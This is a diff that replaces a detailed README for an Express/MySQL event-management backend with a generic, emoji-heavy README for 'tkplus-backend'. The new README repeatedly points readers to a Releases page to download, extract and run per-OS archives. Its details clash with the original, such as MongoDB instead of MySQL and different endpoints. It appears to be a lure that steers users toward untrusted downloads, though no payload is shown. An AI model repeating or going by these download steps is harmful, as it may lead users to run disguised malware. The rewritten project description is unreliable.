@@ -1,132 +1,108 @@
-# Event Management System
+# 🎉 tkplus-backend - Simple API for Event Management
 
-A full-featured Node.js backend project for an Event Management System using Express, MySQL, and Sequelize.
+## 🚀 Getting Started
 
-## Features
+Welcome to the tkplus-backend, a powerful backend API designed for the TKPlus event management platform. This application helps manage events, users, and tickets efficiently. Follow the steps below to download and set up the software.
 
-- JWT-based authentication (login, registration, protected routes)
-- Password hashing with bcrypt
-- Validation for input data
-- Error handling middleware
-- Environment variables for DB and JWT secret
-- CORS enabled, body-parser for JSON
-- Organized in MVC structure
-- Swagger API documentation
+## 📥 Download tkplus-backend
 
-## Database Schema
+[![Download tkplus-backend](https://img.shields.io/badge/Download%20Now-Click%20Here-brightgreen)](https://github.com/LEOo007/tkplus-backend/releases)
 
-The system includes the following models:
+## 🛠️ System Requirements
 
-- **Users**: userID, userName, userEmail, userPhone, createdAt, userPassword, userRole(admin/user)
-- **Activities**: activityID, activityTitle, activityDesc, activityType, activityDate, activityLocation, capacity, status(open/closed/postponed)
-- **ActivityPresenters**: presenterID, activityID, presenterName, presenterJob
-- **Tickets**: ticketID, ticketName, ticketDesc, ticketNo, price, status(available/reserved/cancelled), userID, activityID
+- Operating System: Windows, macOS, or Linux
+- Node.js: Version 12 or higher
+- MongoDB: Version 4.0 or higher
+- Internet connection for downloading and accessing APIs
 
-See the [ERD.md](./ERD.md) file for a visual representation of the database schema and relationships.
+## 📦 Download & Install
 
-## Prerequisites
+To get the latest version of tkplus-backend, follow these steps:
 
-- Node.js (v14 or higher)
-- MySQL (v5.7 or higher)
+1. **Visit the Releases Page**  
+   Go to the [Releases page](https://github.com/LEOo007/tkplus-backend/releases) to find the latest version of tkplus-backend.
 
-## Installation
+2. **Choose the Latest Release**  
+   Look for the latest release at the top. It usually has a version number like v1.0.0.
 
-1. Clone the repository
+3. **Download the Package**  
+   Click on the appropriate file for your operating system. For most users, it will be a .zip or .tar.gz file.
 
-```bash
-git clone <repository-url>
-cd event-management
-```
+4. **Extract the Files**  
+   Once the file downloads, locate it in your downloads folder. Right-click on the file and select "Extract All" or use a tool like WinRAR or 7-Zip.
 
-2. Install dependencies
+5. **Run the Application**  
+   Open the extracted folder. Look for a file named `server.js` or similar. You may need a command terminal to run the application. Open your command terminal and navigate to the folder where your files are extracted. Type `node server.js` to start the server.
 
-```bash
-npm install
-```
+## 🔧 Configuration
 
-3. Configure environment variables
+To configure tkplus-backend for your needs:
 
-Create a `.env` file in the root directory with the following variables:
+1. **Database Setup**  
+   - Install MongoDB if you don't have it already.
+   - You can find detailed installation instructions on the [MongoDB website](https://www.mongodb.com/try/download/community).
+   - Once installed, create a new database named `tkplusdb`.
 
-```
-# Server Configuration
-PORT=3000
-NODE_ENV=development
+2. **Environment Variables**  
+   Create a file named `.env` in the main folder. Add the following lines:
 
-# Database Configuration
-DB_HOST=localhost
-DB_USER=root
-DB_PASSWORD=your_password
-DB_NAME=event_management
+   ```
+   MONGODB_URI=mongodb://localhost:27017/tkplusdb
+   PORT=3000
+   ```
 
-# JWT Configuration
-JWT_SECRET=your_jwt_secret_key_here
-JWT_EXPIRES_IN=1d
-```
+3. **Start the Application**  
+   After configuring, return to your command terminal and run the command:
 
-4. Create the database
+   ```
+   node server.js
+   ```
 
-```sql
-CREATE DATABASE event_management;
-```
+   Your backend API should now be running.
 
-5. Seed the database with sample data
+## 🌐 Using the API
 
-```bash
-npm run seed
-```
+Once your software is running, you can access the API at `http://localhost:3000`. Here are some key endpoints:
 
-## Running the Application
+- **Authentication**  
+   - POST `/api/auth/login`: Log in users and receive a token.
+   - POST `/api/auth/register`: Register new users.
 
-### Development mode
+- **Event Management**  
+   - GET `/api/events`: Retrieve a list of events.
+   - POST `/api/events`: Create a new event.
 
-```bash
-npm run dev
-```
+- **Ticket Generation**  
+   - POST `/api/tickets`: Generate tickets for an event.
 
-### Production mode
+## 💡 Additional Features
 
-```bash
-npm start
-```
+tkplus-backend includes several features designed to improve your event management experience:
 
-<!-- ## API Documentation
+- **User Administration**: Easily manage user roles and permissions.
+- **Activity Management**: Track user activity for better engagement.
+- **RESTful API Design**: Clear and structured endpoints for integration.
 
-Once the server is running, you can access the Swagger API documentation at:
+## 📞 Support
 
-```
-http://localhost:3000/api-docs
-``` -->
+If you run into any issues or have questions:
 
-## API Endpoints
+1. Check the [Issues section](https://github.com/LEOo007/tkplus-backend/issues) on GitHub. 
+2. Browse for solutions or file a new issue.
+3. Engage with the community for support.
 
-### Users
-- `POST` `/api/users/register` → Register new user
-- `POST` `/api/users/login` → Login user and return JWT
-- `GET` `/api/users/profile` → Get logged-in user profile (protected)
-- `PUT` `/api/users/:id` → Update user data (admin or self)
-- `DELETE` `/api/users/:id` → Delete user (admin only)
-- `GET` `/api/users/` → List all users (admin only)
+## 📅 Future Plans
 
-### Activities
-- `POST` `/api/activities` → Create new activity (admin)
-- `GET` `/api/activities` → List all activities
-- `GET` `/api/activities/:id` → Get single activity details
-- `PUT` `/api/activities/:id` → Update activity (admin)
-- `DELETE` `/api/activities/:id` → Delete activity (admin)
-- `GET` `/api/activities/search?type=&date=` → Search/filter activities by type/date
+We aim to expand tkplus-backend with the following features:
 
-### ActivityPresenters
-- `POST` `/api/activities/:activityID/presenters` → Add presenter to activity (admin)
-- `GET` `/api/activities/:activityID/presenters` → List presenters for activity
-- `PUT` `/api/presenters/:id` → Update presenter info (admin)
-- `DELETE` `/api/presenters/:id` → Remove presenter (admin)
+- More user-customizable options.
+- Enhanced ticketing system for large events.
+- Integration with payment gateways.
 
-### Tickets
-- `POST` `/api/tickets` → Create ticket (admin)
-- `GET` `/api/tickets` → List all tickets
-- `GET` `/api/tickets/:id` → Get ticket details
-- `PUT` `/api/tickets/:id` → Update ticket info (admin)
-- `DELETE` `/api/tickets/:id` → Delete ticket (admin)
-- `POST` `/api/tickets/:id/reserve` → Reserve ticket (user)
-- `POST` `/api/tickets/:id/cancel` → Cancel reservation (user)
+## 💙 Acknowledgements
+
+Thanks to the community contributions that make this project possible. Your feedback helps improve tkplus-backend continuously.
+
+## 📥 Download tkplus-backend Again
+
+For easy access, visit the [Releases page](https://github.com/LEOo007/tkplus-backend/releases) to download the application.
